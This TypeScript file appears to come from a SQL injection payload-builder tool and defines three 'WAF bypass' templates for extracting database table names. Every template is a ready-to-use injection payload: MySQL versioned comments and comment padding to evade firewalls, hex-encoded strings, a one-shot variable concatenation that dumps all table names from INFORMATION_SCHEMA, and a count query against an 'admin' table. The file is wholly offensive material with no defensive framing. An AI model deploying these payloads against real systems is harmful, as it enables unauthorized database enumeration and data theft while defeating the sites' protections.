import { BuilderSubcategory, TemplateConfig } from '../../types';

export const tablesTemplates: TemplateConfig[] = [
  {
    id: 'waf-tables-name-group-concat',
    name: 'TABLES_NAME group_concat() WAF',
    description: 'WAF bypass table names extraction with database parameter',
    content: '(/*!50000SELECT*//*!50000GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)*//*!50000FROM*//*!50000INFORMATION_SCHEMA.TABLES*//*!50000WHERE*//*!50000TABLE_SCHEMA*/=DATABASE())',
    parameters: [
      {
        id: 'database',
        label: 'Database',
        defaultValue: 'DATABASE()',
        inputType: 'text'
      }
    ]
  },
  {
    id: 'waf-tables-name-one-shot',
    name: 'TABLES_NAME one shot() WAF',
    description: 'WAF bypass one shot table extraction',
    content: '(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM/*!50000(INFORMATION_SCHEMA.TABLES)*/WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%2b1,4,0x30),0x3a20,table_name,0x3c62723e))))x)',
    parameters: []
  },
  {
    id: 'waf-table-name-count',
    name: 'TABLE NAME COUNT WAF',
    description: 'Table count query with comment bypass',
    content: 'CONCAT(0x636f756e743a20,(/*!50000SELECT*//**/count(0)/**/FROM/**/admin))',
    parameters: []
  }
];

export const tablesSubcategory: BuilderSubcategory = {
  id: 'tables',
  label: 'Tables',
  description: 'WAF bypass table extraction templates and parameter configurations',
  templates: tablesTemplates
};

